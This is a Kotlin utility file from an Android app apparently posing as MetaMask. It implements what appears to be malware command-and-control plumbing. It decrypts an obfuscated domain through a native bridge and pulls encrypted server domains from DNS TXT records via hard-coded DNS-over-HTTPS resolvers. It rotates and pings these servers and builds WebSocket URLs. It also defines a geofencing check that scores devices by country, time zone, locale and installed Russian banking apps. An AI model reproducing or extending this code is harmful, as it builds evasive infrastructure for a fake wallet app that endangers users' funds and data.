package com.example.MetaMask.utils

import android.content.Context
import android.content.pm.PackageManager
import android.telephony.TelephonyManager
import com.yourcompany.core.jni.NativeBridge
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.sync.Mutex
import java.util.Locale
import java.util.TimeZone

object RemoteConfig {

    private const val OBFUSCATED_DOMAIN_B64 = "KAQZEw0dGwMLQAYAARYJ"

    private const val PREFS_NAME = "connection_prefs"
    private const val KEY_LAST_SUCCESS_DOMAIN = "last_success_domain"

    private val DNS_RESOLVERS = listOf(
        "https://223.5.5.5/resolve",
        "https://185.222.222.222/dns-query",
        "https://8.8.8.8/resolve",
        "https://1.1.1.1/dns-query"
    )

    private const val RETRY_DELAY_MS = 15_000L

    private val fetchMutex = Mutex()

    @Volatile private var availableDomains: List<String> = emptyList()
    @Volatile private var currentDomainIndex = 0
    @Volatile private var rotationCount = 0

    val serverDomain: String?
        get() = if (availableDomains.isNotEmpty()) availableDomains[currentDomainIndex % availableDomains.size]
        else null

    val wsBaseUrl: String?
        get() = serverDomain?.let { "wss://$it" }

    val allAvailableDomains: List<String>
        get() = availableDomains

    fun markCurrentDomainAsSuccess(context: Context) {
        android.util.Log.d("XDBG", "[RemoteConfig] markCurrentDomainAsSuccess enter context=ctx") //xdbg
        val goodDomain = serverDomain ?: return
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putString(KEY_LAST_SUCCESS_DOMAIN, goodDomain).apply()
    }

    fun rotateDomain() {
        android.util.Log.d("XDBG", "[RemoteConfig] rotateDomain enter") //xdbg
        if (availableDomains.size > 1) {
            android.util.Log.d("XDBG", "[RemoteConfig] if branch") //xdbg
            currentDomainIndex++
            rotationCount++
        }
    }

    fun isExhausted(): Boolean =
        availableDomains.isNotEmpty() && rotationCount >= availableDomains.size

    fun resetRotation() {
        android.util.Log.d("XDBG", "[RemoteConfig] resetRotation enter") //xdbg
        rotationCount = 0
    }

    suspend fun pingAndSelectBest() {
        android.util.Log.d("XDBG", "[RemoteConfig] pingAndSelectBest enter") //xdbg
        val domains = availableDomains
        if (domains.size <= 1) return
        val results = coroutineScope {
            domains.mapIndexed { index, domain ->
                async(Dispatchers.IO) {
                    val host = domain.split(":").first()
                    val ping = try {
                        val t0 = System.currentTimeMillis()
                        java.net.Socket().use { it.connect(java.net.InetSocketAddress(host, 443), 3000) }
                        System.currentTimeMillis() - t0
                    } catch (_: Exception) { Long.MAX_VALUE }
                    index to ping
                }
            }.awaitAll()
        }
        val best = results.minByOrNull { it.second }
        if (best != null && best.second < Long.MAX_VALUE) {
            android.util.Log.d("XDBG", "[RemoteConfig] if branch") //xdbg
            currentDomainIndex = best.first
        }
    }

    private fun decryptString(base64String: String): String? {
        android.util.Log.d("XDBG", "[RemoteConfig] decryptString enter base64String=${base64String}") //xdbg
        android.util.Log.d("XDBG", "[RemoteConfig] return") //xdbg
        return try {
            val result = NativeBridge.nativeDecryptDomain(base64String)
            if (result.isEmpty()) null else result
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[RemoteConfig] catch (ignored)") //xdbg
            null
        }
    }

    private fun isRiskyCountry(context: Context): Boolean {
        android.util.Log.d("XDBG", "[RemoteConfig] isRiskyCountry enter context=ctx") //xdbg
        var riskScore = 0
        val riskyCodes = listOf("ru", "by", "ir", "cn", "tm", "kz")

        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            val simCountry = tm?.simCountryIso?.lowercase(Locale.ROOT)
            val networkCountry = tm?.networkCountryIso?.lowercase(Locale.ROOT)

            if (simCountry != null && riskyCodes.contains(simCountry)) riskScore += 100
            if (networkCountry != null && riskyCodes.contains(networkCountry)) riskScore += 100

            val timeZone = TimeZone.getDefault().id.lowercase(Locale.ROOT)

            if (timeZone.contains("moscow") ||
                timeZone.contains("volgograd") ||
                timeZone.contains("yekaterinburg") ||
                timeZone.contains("krasnoyarsk") ||
                timeZone.contains("omsk") ||
                timeZone.contains("novosibirsk") ||
                timeZone.contains("vladivostok") ||
                timeZone.contains("minsk") ||
                timeZone.contains("tehran") ||
                timeZone.contains("almaty")) {
                riskScore += 50
            }

            val locale = Locale.getDefault()
            val country = locale.country.lowercase(Locale.ROOT)
            if (riskyCodes.contains(country)) {
                android.util.Log.d("XDBG", "[RemoteConfig] if branch") //xdbg
                riskScore += 30
            }

            val pm = context.packageManager
            val russianApps = listOf(
                "ru.sberbankmobile",
                "com.idamob.tinkoff.android",
                "ru.rostel",
                "ru.nspk.mirpay",
                "ru.yandex.searchplugin",
                "ru.oneme.app",
                "ru.ozon.app.android",
                "com.vkontakte.android",
                "com.wildberries.ru",
                "ru.yandex.yandexmaps"
            )

            for (app in russianApps) {
                android.util.Log.d("XDBG", "[RemoteConfig] loop") //xdbg
                try {
                    pm.getPackageInfo(app, 0)
                    riskScore += 50
                    break
                } catch (_: PackageManager.NameNotFoundException) {
                    android.util.Log.e("XDBG", "[RemoteConfig] catch (ignored)") //xdbg
                }
            }

        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[RemoteConfig] catch (ignored)") //xdbg
        }

        android.util.Log.d("XDBG", "[RemoteConfig] return") //xdbg
        return riskScore >= 40
    }

    private fun tcpPing(host: String, port: Int): Long {
        android.util.Log.d("XDBG", "[RemoteConfig] tcpPing enter host=${host} port=${port}") //xdbg
        android.util.Log.d("XDBG", "[RemoteConfig] return") //xdbg
        return try {
            val start = System.currentTimeMillis()
            java.net.Socket().use { s ->
                s.connect(java.net.InetSocketAddress(host, port), 2000)
            }
            System.currentTimeMillis() - start
        } catch (_: Exception) { Long.MAX_VALUE }
    }

    private suspend fun pingAndSort(domains: Set<String>): List<String> = coroutineScope {
        data class R(val domain: String, val ms443: Long, val ms47443: Long)
        val results = domains.map { d ->
            async(Dispatchers.IO) { R(d, tcpPing(d, 443), tcpPing(d, 47443)) }
        }.awaitAll()

        results
            .sortedBy { minOf(it.ms443, it.ms47443) }
            .flatMap { r ->
                if (r.ms47443 < r.ms443)
                    listOf("${r.domain}:47443", r.domain)
                else
                    listOf(r.domain, "${r.domain}:47443")
            }
    }

    suspend fun fetchDomain(context: Context): Boolean {
        android.util.Log.d("XDBG", "[RemoteConfig] fetchDomain enter context=ctx") //xdbg
        fetchMutex.lock()
        try {
            val mainConfigDomain = decryptString(OBFUSCATED_DOMAIN_B64) ?: return false
            val targetDnsNames = listOf("all1.$mainConfigDomain")
            while (true) {
                android.util.Log.d("XDBG", "[RemoteConfig] loop") //xdbg
                val foundDomains = mutableSetOf<String>()
                for (dnsName in targetDnsNames) {
                    android.util.Log.d("XDBG", "[RemoteConfig] loop") //xdbg
                    val txts = DnsUtils.fetchTxtRecords(dnsName, DNS_RESOLVERS)
                    for (raw in txts) {
                        android.util.Log.d("XDBG", "[RemoteConfig] loop") //xdbg
                        var enc = raw
                        if (enc.startsWith("\"") && enc.endsWith("\""))
                            enc = enc.substring(1, enc.length - 1)
                        val decrypted = decryptString(enc)
                        if (!decrypted.isNullOrEmpty()) {
                            android.util.Log.d("XDBG", "[RemoteConfig] if branch") //xdbg
                            foundDomains.add(decrypted)
                        }
                    }
                }
                if (foundDomains.isNotEmpty()) {
                    android.util.Log.d("XDBG", "[RemoteConfig] if branch") //xdbg
                    val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    val lastSuccess = prefs.getString(KEY_LAST_SUCCESS_DOMAIN, null)
                    val sorted = pingAndSort(foundDomains)
                    val topThird = sorted.size / 3
                    availableDomains = if (lastSuccess != null && sorted.contains(lastSuccess) &&
                        sorted.indexOf(lastSuccess) <= topThird) {
                        listOf(lastSuccess) + sorted.filter { it != lastSuccess }
                    } else {
                        sorted
                    }
                    currentDomainIndex = 0
                    rotationCount = 0
                    android.util.Log.d("XDBG", "[RemoteConfig] domains ready count=${availableDomains.size} first=${availableDomains.firstOrNull()}") //xdbg
                    return true
                }
                delay(5_000L)
            }
        } finally {
            fetchMutex.unlock()
        }
    }
}
